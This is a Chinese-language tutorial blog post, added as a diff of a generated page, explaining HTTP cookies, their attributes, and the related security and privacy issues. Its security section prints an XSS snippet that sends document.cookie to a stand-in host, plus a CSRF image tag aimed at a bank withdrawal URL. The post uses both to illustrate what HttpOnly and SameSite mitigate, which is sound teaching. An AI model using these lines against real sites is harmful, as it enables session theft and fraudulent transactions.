@@ -1,0 +1,674 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.0.2" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="cookie,">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/icon.png?v=5.0.2">
+
+
+
+
+
+
+<meta name="description" content="什么是 cookieHTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。 Cookie的意义：Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。 主要应用 会话状态管理（如">
+<meta name="keywords" content="cookie">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于cookie">
+<meta property="og:url" content="http://yoursite.com/2020/01/08/关于cookie/index.html">
+<meta property="og:site_name" content="Shawnchen &#x2F; XMU 。">
+<meta property="og:description" content="什么是 cookieHTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。 Cookie的意义：Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。 主要应用 会话状态管理（如">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2021-02-14T12:05:31.468Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="关于cookie">
+<meta name="twitter:description" content="什么是 cookieHTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。 Cookie的意义：Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。 主要应用 会话状态管理（如">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Shawnchen'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/01/08/关于cookie/">
+
+
+  <title> 关于cookie | Shawnchen / XMU 。 </title>
+</head>
+
+<body itemscope itemtype="//schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-122678625-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="//schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Shawnchen / XMU 。</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="https://shawnchenxmu.github.io/shawnchenxmu.com/" rel="section">
+            
+            about
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+            Timelines
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                关于cookie
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2020-01-08T21:19:16+08:00" content="2020-01-08">
+              2020-01-08
+            </time>
+          </span>
+
+          
+            <span class="post-category">
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/技术止熵/" itemprop="url" rel="index">
+                    <span itemprop="name">技术止熵</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="什么是-cookie"><a href="#什么是-cookie" class="headerlink" title="什么是 cookie"></a>什么是 cookie</h2><p>HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。</p>
+<p><strong>Cookie的意义：</strong>Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。</p>
+<h2 id="主要应用"><a href="#主要应用" class="headerlink" title="主要应用"></a>主要应用</h2><ul>
+<li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li>
+<li>个性化设置（如用户自定义设置、主题等）</li>
+<li>浏览器行为跟踪（如跟踪分析用户行为等）</li>
+</ul>
+<h2 id="如何创建-cookie"><a href="#如何创建-cookie" class="headerlink" title="如何创建 cookie"></a>如何创建 cookie</h2><h3 id="Set-Cookie"><a href="#Set-Cookie" class="headerlink" title="Set-Cookie"></a>Set-Cookie</h3><p>服务器使用 <code>Set-Cookie</code> 响应头部向用户代理（一般是浏览器）发送 Cookie 信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: &lt;cookie名&gt;=&lt;cookie值&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="会话期Cookie"><a href="#会话期Cookie" class="headerlink" title="会话期Cookie"></a>会话期Cookie</h3><p>浏览器关闭之后它会被自动删除，仅在会话期内有效。<br>会话期Cookie不需要指定过期时间（Expires）或者有效期（Max-Age）。</p>
+<p><strong>注意</strong><br>有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie也会被保留下来，就好像浏览器从来没有关闭一样。</p>
+<h3 id="持久性Cookie"><a href="#持久性Cookie" class="headerlink" title="持久性Cookie"></a>持久性Cookie</h3><p>持久性Cookie可以指定一个特定的过期时间（Expires）或有效期（Max-Age）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</span><br></pre></td></tr></table></figure></p>
+<h3 id="Cookie-的-Secure-和-HttpOnly-标记"><a href="#Cookie-的-Secure-和-HttpOnly-标记" class="headerlink" title="Cookie 的 Secure 和 HttpOnly 标记"></a>Cookie 的 Secure 和 HttpOnly 标记</h3><p><code>Secure</code>：标记为 <code>Secure</code> 的 Cookie 只应通过被 <strong>HTTPS</strong> 协议加密过的请求发送给服务端<br>（从 Chrome 52 和 Firefox 52 开始，不安全的站点（http:）无法使用Cookie的 Secure 标记）</p>
+<p><code>HttpOnly</code>： JavaScript的 <code>Document.cookie</code> API无法访问带有 <code>HttpOnly</code> 标记的Cookie</p>
+<h3 id="Cookie-的作用域"><a href="#Cookie-的作用域" class="headerlink" title="Cookie 的作用域"></a>Cookie 的作用域</h3><p><code>Domain</code>： 标识指定了哪些主机可以接受Cookie。如果不指定，默认为当前文档的主机（不包含子域名）</p>
+<p><code>Path</code>：标识指定了主机下的哪些路径可以接受Cookie</p>
+<h3 id="SameSite-Cookies"><a href="#SameSite-Cookies" class="headerlink" title="SameSite Cookies"></a>SameSite Cookies</h3><p><code>SameSite</code> Cookie允许服务器要求某个 cookie 在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key=value; SameSite=Strict</span><br></pre></td></tr></table></figure>
+<p><strong>SameSite可以有下面三种值：</strong></p>
+<ul>
+<li><code>None</code>： 浏览器会在同站请求、跨站请求下继续发送cookies，不区分大小写</li>
+<li><code>Strict</code>：浏览器将只在访问相同站点时发送cookie。（在原有Cookies的限制条件上的加强，如上文『Cookie的作用域』 所述）</li>
+<li><code>Lax</code>：在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者frames的调用，但只有当用户从外部站点导航到URL时才会发送。如link链接</li>
+</ul>
+<h3 id="JavaScript-通过-Document-cookie-访问-Cookie"><a href="#JavaScript-通过-Document-cookie-访问-Cookie" class="headerlink" title="JavaScript 通过 Document.cookie 访问 Cookie"></a>JavaScript 通过 Document.cookie 访问 Cookie</h3><p>通过 <code>Document.cookie</code> 属性可创建新的 Cookie，也可通过该属性访问非 <code>HttpOnly</code> 标记的 Cookie。</p>
+<h2 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h2><h3 id="会话劫持和-XSS"><a href="#会话劫持和-XSS" class="headerlink" title="会话劫持和 XSS"></a>会话劫持和 XSS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;</span><br></pre></td></tr></table></figure>
+<p><code>HttpOnly</code> 类型的 Cookie 由于阻止了 JavaScript 对其的访问性而能在一定程度上缓解此类攻击。</p>
+<h3 id="跨站请求伪造-CSRF"><a href="#跨站请求伪造-CSRF" class="headerlink" title="跨站请求伪造 CSRF"></a>跨站请求伪造 CSRF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>当你打开含有了这张图片的HTML页面时，如果你之前已经登录了你的银行帐号并且Cookie仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。</p>
+<h2 id="追踪和隐私"><a href="#追踪和隐私" class="headerlink" title="追踪和隐私"></a>追踪和隐私</h2><h3 id="第三方Cookie"><a href="#第三方Cookie" class="headerlink" title="第三方Cookie"></a>第三方Cookie</h3><p>每个Cookie都会有与之关联的域（Domain），如果Cookie的域和页面的域相同，那么我们称这个Cookie为第一方Cookie（first-party cookie），如果Cookie的域和页面的域不同，则称之为第三方Cookie（third-party cookie.）。</p>
+<h2 id="cookie-的未来趋势"><a href="#cookie-的未来趋势" class="headerlink" title="cookie 的未来趋势"></a>cookie 的未来趋势</h2><p>随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）或 IndexedDB。</p>
+<h3 id="禁用第三方-cookie"><a href="#禁用第三方-cookie" class="headerlink" title="禁用第三方 cookie"></a>禁用第三方 cookie</h3><p>Safari 自 13.1 版本起默认禁用第三方cookie<br><a href="https://webkit.org/blog/10218/full-third-party-cookie-blocking-and-more/" target="_blank" rel="noopener">Full Third-Party Cookie Blocking and More | WebKit</a></p>
+<h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies" target="_blank" rel="noopener">HTTP cookies - HTTP | MDN</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie" target="_blank" rel="noopener">Document.cookie - Web API 接口参考 | MDN</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/cookie/" rel="tag">#cookie</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/10/符号表/" rel="next" title="符号表">
+                <i class="fa fa-chevron-left"></i> 符号表
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/01/16/前端数据采集/" rel="prev" title="前端数据采集">
+                前端数据采集 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <!-- 多说评论框 start -->  
+        <div class="ds-thread" data-thread-key="<%- page.path %>" data-title="<%- page.title %>" data-url="<%- page.permalink %>"></div>  
+<!-- 多说评论框 end --> 
+<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"shawnchenxmu"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+     || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+  </script>
+<!-- 多说公共JS代码 end -->
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="//schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="shawnchen">
+          <p class="site-author-name" itemprop="name">shawnchen</p>
+          <p class="site-description motion-element" itemprop="description">一个脱离了高级趣味的人</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">105</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">116</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/shawnchenxmu" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://500px.com/1004740775" target="_blank" title="500px">
+                  
+                    <i class="fa fa-fw fa-500px"></i>
+                  
+                  500px
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href target="_blank" title="Weixin">
+                  
+                    <i class="fa fa-fw fa-weixin"></i>
+                  
+                  Weixin
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是-cookie"><span class="nav-text">什么是 cookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#主要应用"><span class="nav-text">主要应用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如何创建-cookie"><span class="nav-text">如何创建 cookie</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Set-Cookie"><span class="nav-text">Set-Cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#会话期Cookie"><span class="nav-text">会话期Cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#持久性Cookie"><span class="nav-text">持久性Cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie-的-Secure-和-HttpOnly-标记"><span class="nav-text">Cookie 的 Secure 和 HttpOnly 标记</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie-的作用域"><span class="nav-text">Cookie 的作用域</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SameSite-Cookies"><span class="nav-text">SameSite Cookies</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JavaScript-通过-Document-cookie-访问-Cookie"><span class="nav-text">JavaScript 通过 Document.cookie 访问 Cookie</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安全"><span class="nav-text">安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#会话劫持和-XSS"><span class="nav-text">会话劫持和 XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#跨站请求伪造-CSRF"><span class="nav-text">跨站请求伪造 CSRF</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#追踪和隐私"><span class="nav-text">追踪和隐私</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第三方Cookie"><span class="nav-text">第三方Cookie</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie-的未来趋势"><span class="nav-text">cookie 的未来趋势</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#禁用第三方-cookie"><span class="nav-text">禁用第三方 cookie</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#相关资料"><span class="nav-text">相关资料</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">shawnchen</span>
+</div>
+
+<div class="powered-by">
+  一切都将逝去
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.2"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+
+</body>
+</html>
